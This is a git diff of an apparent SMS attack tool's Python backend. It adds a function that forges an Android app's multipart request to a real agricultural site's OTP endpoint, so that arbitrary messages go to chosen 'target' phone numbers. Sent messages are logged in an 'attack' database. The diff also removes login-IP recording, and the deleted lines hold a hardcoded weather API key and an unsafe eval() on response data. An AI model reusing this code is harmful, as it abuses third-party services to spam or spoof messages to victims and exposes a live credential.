@@ -1,3 +1,4 @@
+from db import accessk, adminacc
 from pymongo.mongo_client import MongoClient
 from encryption import *
 import random
@@ -129,7 +130,7 @@ async def afterlog(ip, keyss):
         pas = conn.masbom.login.find_one({"key": keyss}, {'no': 1, '_id': 0})
         newno = pas['no']
         nnewno = int(newno) + 1
-        conn.masbom.login.update_one({"key": str(keyss)}, {'$set': {f'ip{newno}': ip, "no": str(nnewno)}})
+
         return "ok"
     except Exception as e:
         return "failed"
@@ -245,7 +246,7 @@ async def sendmail(to, fromm, sub, msg, ekey):
         return "failed"
 
 
-async def cusapicall(num, msg):
+async def cusapicalllove(num, msg , deviceid):
     try:
         headers = {
             # 'Host': 'homedeliverybackend.mpaani.com',
@@ -290,51 +291,52 @@ async def cusapicall(num, msg):
         return "fail"
 
 
+async def cusapicallkrishi(num, msg , deviceid):
+    try:
+        headers = {
+            'Host': 'thekrishi.com',
+            'Accept': 'application/json;charset=UTF-8',
+            'Content-Type': 'multipart/form-data; boundary=f32dd0bf-ca26-4be6-9d71-5652a6eee3cb',
+            # 'Content-Length': '1202',
+            # 'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'okhttp/4.9.0',
+            'Connection': 'close',
+        }
+
+        params = {
+            'lang': 'en',
+            'ver': '296',
+            'android_id': f'{deviceid}',
+        }
+
+        data = f'--f32dd0bf-ca26-4be6-9d71-5652a6eee3cb\r\nContent-Disposition: form-data; name="name"\r\nContent-Transfer-Encoding: binary\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Length: 4\r\n\r\ntera\r\n--f32dd0bf-ca26-4be6-9d71-5652a6eee3cb\r\nContent-Disposition: form-data; name="country_code"\r\nContent-Transfer-Encoding: binary\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Length: 2\r\n\r\n91\r\n--f32dd0bf-ca26-4be6-9d71-5652a6eee3cb\r\nContent-Disposition: form-data; name="phone_no"\r\nContent-Transfer-Encoding: binary\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Length: 10\r\n\r\n{num}\r\n--f32dd0bf-ca26-4be6-9d71-5652a6eee3cb\r\nContent-Disposition: form-data; name="source"\r\nContent-Transfer-Encoding: binary\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Length: 7\r\n\r\nandroid\r\n--f32dd0bf-ca26-4be6-9d71-5652a6eee3cb\r\nContent-Disposition: form-data; name="count"\r\nContent-Transfer-Encoding: binary\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Length: 1\r\n\r\n1\r\n--f32dd0bf-ca26-4be6-9d71-5652a6eee3cb\r\nContent-Disposition: form-data; name="sms_hash"\r\nContent-Transfer-Encoding: binary\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Length: 15\r\n\r\n{msg}\r\n--f32dd0bf-ca26-4be6-9d71-5652a6eee3cb--\r\n'
+        esponse = requests.post('https://thekrishi.com/v2/otp/get', params=params, headers=headers,
+                                 data=data)
+        response = esponse.json()
+        out = response["status"]
+        if out == "success":
+            return "success"
+        else:
+            return "fail"
+
+    except Exception as e:
+
+        return "fail"
+
+
 async def sendcusmail(num, msg, deviceid):
     try:
         ind_time = datetime.now(timezone("Asia/Kolkata")).strftime('%Y-%m-%d %H:%M:%S.%f')
         conp.attack.customsms.insert_one(
             {"device": deviceid, "target": num, "message": msg, "time": str(ind_time)})
-        cusapi = await cusapicall(num, msg)
+        if len(msg) <= 10:
+            cusapi = await cusapicalllove(num, msg , deviceid)
 
+        else:
+            cusapi = await cusapicallkrishi(num, msg , deviceid)
         if cusapi == "success":
             return "success"
         else:
             return "fail"
     except Exception as e:
         return "fail"
-
-
-async def whetapi(destination):
-    try:
-        async with aiohttp.ClientSession() as sess:
-            async with sess.get(
-                    "https://api.openweathermap.org/data/2.5/weather?q="+destination+"&appid=59b25e5ee2e5325b12bc95f09ca7637d") as response:
-                coor = await response.json()
-                price = [7874, 74565, 787, 7845, 4125]
-                pricee = random.choice(price)
-                bu = json.dumps(coor)
-                data = json.loads(bu)
-                value = data.get("coord")
-                value4 = data.get("weather")
-                modified_list = str(value4).replace('[', '').replace(']', '')
-                weatmain = eval(modified_list)
-
-
-
-                value3 = data.get("main")
-
-                ll = value["lon"]
-
-                lo = value['lat']
-
-
-
-                te = value3['temp']
-                return {"lon": str(ll), "lat": str(lo), "temp": str(te), "price": pricee, "weather": weatmain["main"]}
-
-
-
-    except Exception as e:
-        print(e)
-        return False
